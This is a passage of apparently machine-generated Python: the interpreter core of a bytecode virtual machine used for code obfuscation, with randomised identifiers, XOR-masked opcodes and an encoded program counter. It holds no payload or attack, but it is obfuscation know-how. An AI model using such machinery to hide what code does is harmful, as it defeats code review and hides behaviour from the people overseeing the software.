      start, stop, step = i.indices(L); indices = list(range(start, stop, step)); v_list = list(v)
      if step == 1:
        delta = len(v_list) - len(indices)
        if delta > 0:
          for k in range(L - 1, stop - 1, -1):
            self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
        elif delta < 0:
          for k in range(stop, L):
            self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
          for k in range(L + delta, L):
            self.m[self.b + k * self.d] = None
        for idx_k, item in enumerate(v_list):
          self.m[self.b + (start + idx_k) * self.d] = item
        self.p += delta * self.d
      else:
        if len(indices) != len(v_list):
          raise ValueError('attempt to assign sequence to extended slice of different size')
        for idx_k, item in zip(indices, v_list):
          self.m[self.b + idx_k * self.d] = item
      return
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('list assignment index out of range')
    self.m[self.b + i * self.d] = v
  def __delitem__(self, i):
    L = self.__len__()
    if isinstance(i, slice):
      start, stop, step = i.indices(L)
      if step == 1:
        to_remove = max(0, stop - start)
        if to_remove > 0:
          for k in range(stop, L):
            self.m[self.b + (k - to_remove) * self.d] = self.m[self.b + k * self.d]
          for k in range(L - to_remove, L):
            self.m[self.b + k * self.d] = None
          self.p -= to_remove * self.d
      else:
        indices = sorted(list(range(start, stop, step))); to_del = set(indices)
        new_items = [self.m[self.b + x * self.d] for x in range(L) if x not in to_del]
        for x, val in enumerate(new_items):
          self.m[self.b + x * self.d] = val
        for x in range(len(new_items), L):
          self.m[self.b + x * self.d] = None
        self.p = self.b + len(new_items) * self.d
      return
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('list assignment index out of range')
    for k in range(i, L - 1):
      self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
    self.p -= self.d; self.m[self.p] = None
  def __iter__(self):
    for i in range(self.__len__()):
      yield self.m[self.b + i * self.d]
  def clear(self):
    L = self.__len__()
    for i in range(L):
      self.m[self.b + i * self.d] = None
    self.p = self.b
  def copy(self):
    return [self.m[self.b + i * self.d] for i in range(self.__len__())]
class _dkpfpjhrh:
  __slots__ = ('val',)
  def __init__(self, val=None):
    self.val = val
class _bk6scw1k(list):
  _kzrwrfkd = 32
  def __init__(self, code, globals_dict, locals_dict=None, fastlocals=None, closure=None, func=None):
    super().__init__([None] * 4096); self[8] = code; self[0] = globals_dict
    self[22] = locals_dict if locals_dict is not None else globals_dict; self[25] = closure or (); self[15] = func; self[19] = self
    self[18] = _gb8c68oz(self, 32, len(code.varnames))
    if fastlocals is not None:
      for i, v in enumerate(fastlocals):
        self[18][i] = v
    self[17] = _gb8c68oz(self, 160, 256); self[13] = _z3qxcqflnr(self, 416, 1); self[24] = []
    for var in code.cellvars:
      init_val = None
      if var in code.varnames:
        v_idx = code.varnames.index(var)
        if v_idx < len(self[18]):
          init_val = self[18][v_idx]
      self[24].append(_dkpfpjhrh(init_val))
    if closure:
      self[24].extend(closure)
    self[12] = []; self[5] = None; self[6] = (68 ^ 9731) + 45; self[21] = None; self[20] = None; self[30] = []; self[16] = 0
class _i0ycvnij:
  def __init__(self, code, globals_dict, defaults=(), kw_defaults=None, closure=None):
    self.code = code; self.globals_dict = globals_dict; self.defaults = defaults; self.kw_defaults = kw_defaults or {}
    self.closure = closure or (); self._agwzuf0c = True; self.__name__ = code.name; self.__qualname__ = code.name; self.__doc__ = None
    self.__defaults__ = defaults if defaults else None; self.__kwdefaults__ = kw_defaults if kw_defaults else None
    self.__closure__ = closure; self.__code__ = code; self.__module__ = globals_dict.get('__name__', '__main__')
  def __get__(self, instance, owner=None):
    if instance is None:
      return self
    return _types.MethodType(self, instance)
  def execute_with_locals(self, locals_dict):
    f = _bk6scw1k(self.code, self.globals_dict, locals_dict=locals_dict, closure=self.closure, func=self); return _fh2r5q3s(f)
  def __call__(self, *args, **kwargs):
    fastlocals = _agj8eu2w(self.code, args, kwargs, self.defaults, self.kw_defaults)
    f = _bk6scw1k(self.code, self.globals_dict, fastlocals=fastlocals, closure=self.closure, func=self); return _fh2r5q3s(f)
def _jqhootrp(left, right, cmp_arg):
  if cmp_arg == 0:
    return left < right
  elif cmp_arg == 1:
    return left <= right
  elif cmp_arg == 2:
    return left == right
  elif cmp_arg == 3:
    return left != right
  elif cmp_arg == 4:
    return left > right
  elif cmp_arg == 5:
    return left >= right
  elif cmp_arg == 6:
    return left in right
  elif cmp_arg == 7:
    return left not in right
  elif cmp_arg == 8:
    return left is right
  elif cmp_arg == 9:
    return left is not right
  elif cmp_arg == 10:
    return isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
  return False
def _vtdf6s53s(pairs):
  d = {}
  for i in range(0, len(pairs), 2):
    d[pairs[i]] = pairs[i + 1]
  return d
def _hayqxf77(name, globals_dict, builtins_dict, frame):
  if name in globals_dict:
    return globals_dict[name]
  elif name == 'super':
    def _srbwq0zs79(*args):
      if not args:
        if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
          return _builtins.super(frame[15].__class_owner__, frame[18][0])
      return _builtins.super(*args)
    return _srbwq0zs79
  elif builtins_dict and name in builtins_dict:
    return builtins_dict[name]
  raise NameError(f"name '{name}' is not defined")
_RET_SIGNAL = object()
def _xa904(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg] = stack.pop()
def _xz96f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  frame[21] = fastlocals[arg]; return _RET_SIGNAL
def _xwa69(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  fastlocals[arg] = None
def _xw762(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]] = registers[arg[1]] - registers[arg[2]]
def _xz529(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _d20j5r4q, _ty0u5diw9, _o7zsvgfo = arg; registers[_d20j5r4q] = registers[_ty0u5diw9] + registers[_o7zsvgfo]
def _xm5cb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _rv0wnbxp = stack.pop(); _ttks8qnty8 = stack.pop(); stack.append(_ttks8qnty8 / _rv0wnbxp)
def _xpd45(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _uk6su3ymmb = stack[-1]; stack[-1] = stack[-2]; stack[-2] = stack[-3]; stack[-3] = _uk6su3ymmb
def _xt424(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  right = stack.pop(); left = stack.pop(); stack.append(left - right)
def _xj2ee(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]] = registers[arg[1]] + registers[arg[2]]
def _xtfe7(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  pass
def _xbc06(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]] = registers[arg[1]] & registers[arg[2]]
def _xeb48(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]] = registers[arg[1]] % registers[arg[2]]
def _xie1c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]].add(registers[arg[1]])
def _xgbcd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  stack.append(stack[-1])
def _xue08(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  stack[-1] = not stack[-1]
def _xb456(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  attr_idx, argc = arg; name = names[attr_idx]; args = stack[-argc:] if argc > 0 else []
  if argc > 0:
    del stack[-argc:]
  obj = stack.pop(); func = getattr(obj, name)
  if isinstance(func, _types.MethodType) and isinstance(func.__func__, _i0ycvnij):
    args = [func.__self__] + list(args); func = func.__func__
  if isinstance(func, _i0ycvnij):
    _fl = _agj8eu2w(func.code, args, {}, func.defaults, func.kw_defaults)
    frame[20] = _bk6scw1k(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
  else:
    stack.append(func(*args))
def _xi4eb(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  globals_dict[names[arg[0]]] = registers[arg[1]]
def _xm51e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _ypvkldykq = names[arg]; _em0egffxi = globals_dict
  if _ypvkldykq in _em0egffxi:
    _ftzg2tet50 = _em0egffxi[_ypvkldykq]; stack.append(_ftzg2tet50)
  elif _ypvkldykq == 'super':
    def _srbwq0zs79(*args):
      if not args:
        if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
          return _builtins.super(frame[15].__class_owner__, frame[18][0])
      return _builtins.super(*args)
    stack.append(_srbwq0zs79)
  elif builtins_dict and _ypvkldykq in builtins_dict:
    stack.append(builtins_dict[_ypvkldykq])
  else:
    raise NameError(f"name '{_ypvkldykq}' is not defined")
def _xlc89(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]] = registers[arg[1]] >> registers[arg[2]]
def _xo303(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  right = stack.pop(); left = stack.pop(); stack.append(left in right)
def _xz6d2(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  right = stack.pop(); left = stack.pop(); stack.append(left | right)
def _xr5f6(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  frame[24][arg[0]].val = registers[arg[1]]
def _xb1d8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  cmp_arg, target_pc = arg; right = stack.pop(); left = stack.pop(); res = False
  if cmp_arg == 0:
    res = left < right
  elif cmp_arg == 1:
    res = left <= right
  elif cmp_arg == 2:
    res = left == right
  elif cmp_arg == 3:
    res = left != right
  elif cmp_arg == 4:
    res = left > right
  elif cmp_arg == 5:
    res = left >= right
  elif cmp_arg == 6:
    res = left in right
  elif cmp_arg == 7:
    res = left not in right
  elif cmp_arg == 8:
    res = left is right
  elif cmp_arg == 9:
    res = left is not right
  elif cmp_arg == 10:
    res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
  if not res:
    frame[6] = (target_pc ^ 9731) + 45
def _xo7c6(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]] = registers[arg[1]] // registers[arg[2]]
def _xz9c8(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  frame[21] = stack.pop(); return _RET_SIGNAL
def _xo991(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _k89034na = stack.pop(); _c7cq92c7 = stack.pop(); stack.append(_c7cq92c7 | _k89034na)
def _xhbc6(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  if arg == 0:
    stack.append(set())
  else:
    items = set(stack[-arg:]); del stack[-arg:]; stack.append(items)
def _xy214(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _te7vm86ecl = names[arg]
  if _te7vm86ecl in globals_dict:
    del globals_dict[_te7vm86ecl]
  else:
    raise NameError(f"name '{_te7vm86ecl}' is not defined")
def _xo9e7(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  right = stack.pop(); left = stack.pop(); stack.append(left // right)
def _xjaaf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]] = iter(registers[arg[1]])
def _xjf17(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _l1mapjim = stack.pop(); _xxmo72sob = stack.pop(); stack.append(_xxmo72sob ^ _l1mapjim)
def _xt7d6(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  args = stack[-arg:] if arg > 0 else []
  if arg > 0:
    del stack[-arg:]
  func = stack.pop()
  if isinstance(func, _types.MethodType) and isinstance(func.__func__, _i0ycvnij):
    args = [func.__self__] + list(args); func = func.__func__
  if isinstance(func, _i0ycvnij):
    _fl = _agj8eu2w(func.code, args, {}, func.defaults, func.kw_defaults)
    frame[20] = _bk6scw1k(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
  else:
    stack.append(func(*args))
def _xid85(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  name_idx, argc = arg; name = names[name_idx]
  if name == 'super' and argc == 0:
    if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
      stack.append(_builtins.super(frame[15].__class_owner__, frame[18][0]))
    else:
      stack.append(_builtins.super())
  else:
    func = globals_dict.get(name) or (builtins_dict.get(name) if builtins_dict else getattr(_builtins, name, None))
    args = stack[-argc:] if argc > 0 else []
    if argc > 0:
      del stack[-argc:]
    if isinstance(func, _types.MethodType) and isinstance(func.__func__, _i0ycvnij):
      args = [func.__self__] + list(args); func = func.__func__
    if isinstance(func, _i0ycvnij):
      _fl = _agj8eu2w(func.code, args, {}, func.defaults, func.kw_defaults)
      frame[20] = _bk6scw1k(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
    else:
      stack.append(func(*args))
def _xkb0d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  right = stack.pop(); left = stack.pop(); stack.append(left % right)
def _xx65c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  if arg == 0:
    stack.append(())
  else:
    items = tuple(stack[-arg:]); del stack[-arg:]; stack.append(items)
def _xp3d5(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  while len(fastlocals) <= arg[0]:
    fastlocals.append(None)
  fastlocals[arg[0]] = registers[arg[1]]
def _xu34e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  frame[6] = (arg ^ 9731) + 45
def _xp773(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]].append(registers[arg[1]])
def _xb802(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _ypvkldykq = names[arg]
  if _ypvkldykq in globals_dict:
    stack.append(globals_dict[_ypvkldykq])
  elif _ypvkldykq == 'super':
    def _srbwq0zs79(*args):
      if not args:
        if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
          return _builtins.super(frame[15].__class_owner__, frame[18][0])
      return _builtins.super(*args)
    stack.append(_srbwq0zs79)
  elif builtins_dict and _ypvkldykq in builtins_dict:
    stack.append(builtins_dict[_ypvkldykq])
  else:
    raise NameError(f"name '{_ypvkldykq}' is not defined")
def _xm23a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _d, _b, _c = arg; registers[_d] = tuple((registers[_b + i] for i in range(_c)))
def _xo8b0(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  stack.append(fastlocals[arg[0]] + consts[arg[1]])
def _xce3b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  stack.append(fastlocals[arg[0]] * consts[arg[1]])
def _xfaa4(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  pass
def _xu6f1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _d0_c = consts[arg]; registers[0] = _d0_c; _d1_ret = registers[0]; frame[21] = _d1_ret; return _RET_SIGNAL
def _xpd43(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _d, _cr, _fl = arg; _co = registers[_cr]; _cl = []
  if _co.freevars:
    for _v in _co.freevars:
      if _v in frame[8].cellvars:
        _cl.append(frame[24][frame[8].cellvars.index(_v)])
      elif _v in frame[8].freevars:
        _cl.append(frame[24][len(frame[8].cellvars) + frame[8].freevars.index(_v)])
  _defs = registers[_d] if _fl & 1 else (); _kwdefs = (registers[_d + 1] if _fl & 1 else registers[_d]) if _fl & 2 else {}
  registers[_d] = _i0ycvnij(_co, globals_dict, defaults=_defs or (), kw_defaults=_kwdefs or {}, closure=tuple(_cl))
def _xl43e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  right = stack.pop(); left = stack.pop(); stack.append(left >> right)
def _xd596(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _kumbsszyi = stack.pop(); _qe83jjs1y = stack.pop(); stack.append(_qe83jjs1y & _kumbsszyi)
def _xkab6(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]] = frame[24][arg[1]].val
def _dd652(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  if frame is None:
    return None
  return (frame[6] - 45 ^ 9731 ^ 90) & 255
def _xk80f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  d = {}
  if arg > 0:
    pairs = stack[-2 * arg:]; del stack[-2 * arg:]
    for i in range(0, len(pairs), 2):
      d[pairs[i]] = pairs[i + 1]
  stack.append(d)
def _xs606(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _il4v6xek = stack.pop(); _xsfd308u07 = stack.pop(); stack.append(_xsfd308u07 % _il4v6xek)
def _xw8c4(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]][registers[arg[1]]] = registers[arg[2]]
def _xi35f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _a5i5hzh32k = names[arg]
  if _a5i5hzh32k in locals_dict:
    stack.append(locals_dict[_a5i5hzh32k])
  elif _a5i5hzh32k in globals_dict:
    stack.append(globals_dict[_a5i5hzh32k])
  elif _a5i5hzh32k == 'super':
    def _srbwq0zs79(*args):
      if not args:
        if True and frame[15] and hasattr(frame[15], '__class_owner__') and frame[18]:
          return _builtins.super(frame[15].__class_owner__, frame[18][0])
      return _builtins.super(*args)
    stack.append(_srbwq0zs79)
  elif builtins_dict and _a5i5hzh32k in builtins_dict:
    stack.append(builtins_dict[_a5i5hzh32k])
  else:
    raise NameError(f"name '{_a5i5hzh32k}' is not defined")
def _xka88(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _d0_0 = stack.pop(); locals_dict[names[arg[0]]] = _d0_0; _d1_c = consts[arg[1]]; registers[0] = _d1_c
def _xg714(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].add(val)
def _xc313(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  right = stack.pop(); left = stack.pop(); stack.append(left ** right)
def _xk146(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _ph3o8i0eat = stack.pop(); _roqdu32vjk = stack.pop(); stack.append(_roqdu32vjk + _ph3o8i0eat)
def _xo29a(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  stack.append(getattr(fastlocals[arg[0]], names[arg[1]]))
def _xt3dc(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _z6p79959 = stack.pop(); _p9ob82yg = stack.pop(); stack.append(_p9ob82yg - _z6p79959)
def _xuf74(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  frame[21] = consts[arg]; return _RET_SIGNAL
def _xz524(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  registers[arg[0]] = consts[arg[1]]
def _dlb7c(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  if frame is None:
    return None
  return (frame[6] - 45 ^ 9731 ^ 90) & 255
def _xkbe1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  _kvpoe7vhq = stack.pop(); _ky7kmup1 = stack.pop(); stack.append(_ky7kmup1 // _kvpoe7vhq)
def _xlf8b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  val = stack.pop()
  if val:
    frame[6] = (arg ^ 9731) + 45
def _xy1ba(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  mod = stack.pop()
  if hasattr(mod, '__all__'):
    for k in mod.__all__:
      locals_dict[k] = getattr(mod, k)
  else:
    for k, v in mod.__dict__.items():
      if not k.startswith('_'):
        locals_dict[k] = v
def _xh38d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  val = stack.pop()
  if not val:
    frame[6] = (arg ^ 9731) + 45
def _xybed(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  while len(fastlocals) <= arg:
    fastlocals.append(None)
  fastlocals[arg] = stack.pop()
def _xif9f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers):
  right = stack.pop(); left = stack.pop(); stack.append(left is right)
_t0_ed89 = {57691: _xie1c, 62677: _xce3b, 58545: _xkab6, 58699: _xc313, 63120: _xz529, 57626: _xp773, 57633: _xk146, 63079: _xif9f, 61315: _xd596, 63382: _xm51e, 58104: _xpd43, 58183: _xka88, 59493: _xkb0d, 59321: _xw762, 59147: _xk80f, 63321: _xz9c8, 58675: _xp3d5, 59168: _xid85, 60716: _xb802, 59428: _xybed, 60502: _xo29a, 57508: _xtfe7, 60966: _xy214, 59152: _xj2ee, 59777: _xlc89, 63091: _xhbc6, 58420: _xlf8b, 60825: _xg714, 61224: _xgbcd, 60296: _xm23a, 59393: _xjf17, 61396: _xl43e, 58044: _xz6d2, 57749: _xh38d, 58790: _xeb48, 59782: _xt3dc, 60369: _xa904, 62494: _xuf74, 58602: _xo8b0, 59576: _xx65c, 60789: _xi35f, 63404: _xo991, 58333: _xfaa4, 61185: _xu34e, 58127: _xu6f1, 58861: _xz96f, 60236: _xjaaf, 59599: _xi4eb, 61311: _xr5f6, 58192: _xs606, 60864: _xw8c4, 58086: _xy1ba, 60225: _xb1d8, 60978: _xue08, 60649: _xt7d6, 58103: _xo7c6, 61049: _xpd45, 59816: _xbc06, 61250: _xo9e7, 57908: _xb456, 62748: _xo303, 60886: _xt424, 59678: _xwa69, 57614: _xkbe1, 60489: _xm5cb, 58515: _xz524}
_t0jkqg84l = None
def _fh2r5q3s(frame):
  global _t0jkqg84l; old_frame = _t0jkqg84l; _t0jkqg84l = frame; _lvtxb8a5 = []
  try:
    code = frame[8]; instructions = code.instructions; consts = code.consts; names = code.names; stack = frame[13]; registers = frame[17]
    fastlocals = frame[18]; globals_dict = frame[0]; locals_dict = frame[22]; builtins_dict = globals_dict.get('__builtins__')
    if isinstance(builtins_dict, type(_sys)):
      builtins_dict = builtins_dict.__dict__
    elif hasattr(builtins_dict, '__dict__'):
      builtins_dict = builtins_dict.__dict__
    def _h0dorhjqvn(new_f):
      nonlocal frame, code, instructions, consts, names, stack, registers, fastlocals, globals_dict, locals_dict, builtins_dict
      _lvtxb8a5.append(frame); frame = new_f; code = frame[8]; instructions = code.instructions; consts = code.consts; names = code.names
      stack = frame[13]; registers = frame[17]; fastlocals = frame[18]; globals_dict = frame[0]; locals_dict = frame[22]
      builtins_dict = globals_dict.get('__builtins__')
      if isinstance(builtins_dict, type(_sys)):
        builtins_dict = builtins_dict.__dict__
      elif hasattr(builtins_dict, '__dict__'):
        builtins_dict = builtins_dict.__dict__
      return True
    def _nbusank91i(val):
      nonlocal frame, code, instructions, consts, names, stack, registers, fastlocals, globals_dict, locals_dict, builtins_dict
      if _lvtxb8a5:
        frame = _lvtxb8a5.pop(); code = frame[8]; instructions = code.instructions; consts = code.consts; names = code.names
        stack = frame[13]; registers = frame[17]; fastlocals = frame[18]; globals_dict = frame[0]; locals_dict = frame[22]
        builtins_dict = globals_dict.get('__builtins__')
        if isinstance(builtins_dict, type(_sys)):
          builtins_dict = builtins_dict.__dict__
        elif hasattr(builtins_dict, '__dict__'):
          builtins_dict = builtins_dict.__dict__
        stack.append(val); return True
      return False
    while frame[6] - 45 ^ 9731 in instructions:
      opcode, arg = instructions[frame[6] - 45 ^ 9731]; frame[6] = ((frame[6] - 45 ^ 9731) + 7 ^ 9731) + 45
      try:
        _pce4 = ((opcode ^ 19360) + ((frame[6] - 45 ^ 9731) & 0)) % 3
        if _pce4 == 0:
          _h0_7a9 = _t0_ed89.get(opcode ^ 58996)
          if _h0_7a9:
            res = _h0_7a9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts, registers)
            if res is _RET_SIGNAL:
              if _nbusank91i(frame[21]):
                continue
              return frame[21]
        elif _pce4 == 1:
          if opcode < 2531:
            if opcode < 1101:
              if opcode < 551:
                if opcode < 347:
                  if opcode < 227:
                    if opcode == 151:
                      stack[-2] = stack[-2] + stack[-1]; stack.pop()
                    elif opcode == 170:
                      _bzbg2lzdw = stack.pop()
                      while len(fastlocals) <= arg:
                        fastlocals.append(None)
                      fastlocals[arg] = _bzbg2lzdw
                  elif opcode == 227:
                    right = stack.pop(); left = stack.pop(); stack.append(left not in right)
                  elif opcode == 332:
                    registers[arg[0]] = registers[arg[1]](*[registers[arg[1] + 1 + i] for i in range(arg[2])])
                elif opcode < 442:
                  if opcode == 347:
                    stack.append(registers[arg])
                  elif opcode == 433:
                    right = stack.pop(); left = stack.pop(); stack.append(left @ right)
                elif opcode < 484:
                  if opcode == 442:
                    right = stack.pop(); left = stack.pop(); stack.append(left > right)
                elif opcode == 484:
                  right = stack.pop(); left = stack.pop(); stack.append(left != right)
                elif opcode == 523:
                  stack.append(frame[24][arg].val)
              elif opcode < 953:
                if opcode < 586:
                  if opcode == 551:
                    _s3jlzzkx = stack.pop()
                    if bool(_s3jlzzkx) is True:
                      frame[6] = (arg ^ 9731) + 45
                  elif opcode == 563:
                    _xpsa7qtwk1 = stack.pop(); _w9upkwwc = stack.pop(); stack.append(_w9upkwwc << _xpsa7qtwk1)
                elif opcode < 874:
                  if opcode == 586:
                    _val = stack.pop()
                    if arg >= len(fastlocals):
                      fastlocals.extend([None] * (arg - len(fastlocals) + 1))
                    fastlocals[arg] = _val
                elif opcode == 874:
                  locals_dict[names[arg]] = stack.pop()
                elif opcode == 947:
                  _d, _b, _c = arg; registers[_d] = set((registers[_b + i] for i in range(_c)))
              elif opcode < 998:
                if opcode == 953:
                  right = stack.pop(); left = stack.pop(); stack.append(left / right)
                elif opcode == 982:
                  frame[12].append(_y31tq6yfhk(_ugv73aoyf.FINALLY, arg, len(stack)))
              elif opcode < 1041:
                if opcode == 998:
                  stack.extend([stack[-2], stack[-1]])
              elif opcode == 1041:
                stack.append(getattr(stack[-1], names[arg]))
              elif opcode == 1072:
                _rb1nmqbpjj = stack.pop(); frame[24][arg].val = _rb1nmqbpjj
            elif opcode < 1719:
              if opcode < 1289:
                if opcode < 1190:
                  if opcode == 1101:
                    _ullsrxuf = stack.pop(); frame[6] = ((arg if not _ullsrxuf else frame[6] - 45 ^ 9731) ^ 9731) + 45
                  elif opcode == 1132:
                    _d00laqfnjd, _hvq5b3b9 = stack[-2:]; del stack[-2:]; stack.append(_d00laqfnjd[_hvq5b3b9])
                elif opcode == 1190:
                  _r = stack.pop(); _l = stack[-1]
                  frame[16] = (frame[16] * 1103515245 + 12345 ^ (_l if type(_l) is int else 0)) & 4294967295
                  stack[-1] = (_l ^ _r) + 2 * (_l & _r) if type(_l) is int and type(_r) is int else _l + _r
                elif opcode == 1286:
                  registers[arg[0]] = registers[arg[1]] << registers[arg[2]]
              elif opcode < 1479:
                if opcode == 1289:
                  registers[arg[0]][registers[arg[1]]] = registers[arg[2]]
                elif opcode == 1326:
                  stack.pop(-1)
              elif opcode < 1661:
                if opcode == 1479:
                  val = stack.pop(); key = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth][key] = val
              elif opcode == 1661:
                stack.append(fastlocals[arg])
              elif opcode == 1670:
                right = stack.pop(); left = stack.pop(); stack.append(left * right)
            elif opcode < 2090:
              if opcode < 1918:
                if opcode == 1719:
                  key = stack.pop(); obj = stack.pop(); del obj[key]
                elif opcode == 1866:
                  _dst, _nidx, _flreg = arg
                  _nm = consts[_nidx] if isinstance(consts, (list, tuple)) and _nidx < len(consts) and isinstance(consts[_nidx], str) else names[_nidx]
                  registers[_dst] = __import__(_nm, globals_dict, locals_dict, registers[_flreg], 0)
              elif opcode < 2018:
                if opcode == 1918:
                  _d, _s1, _s2 = arg; _a = registers[_s1]; _b = registers[_s2]
                  registers[_d] = (_a | _b) + (_a & _b) if type(_a) is int and type(_b) is int else _a + _b
              elif opcode == 2018:
                _args = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []; _func = stack.pop()
                if isinstance(_func, _types.MethodType) and isinstance(_func.__func__, _i0ycvnij):
                  _args = [_func.__self__] + list(_args); _func = _func.__func__
                if isinstance(_func, _i0ycvnij):
                  _fl = _agj8eu2w(_func.code, _args, {}, _func.defaults, _func.kw_defaults)
                  frame[20] = _bk6scw1k(_func.code, _func.globals_dict, fastlocals=_fl, closure=_func.closure, func=_func)
                else:
                  stack.append(_func(*_args))
              elif opcode == 2074:
                _r = stack.pop(); stack[-1] = stack[-1] ^ _r
            elif opcode < 2258:
              if opcode == 2090:
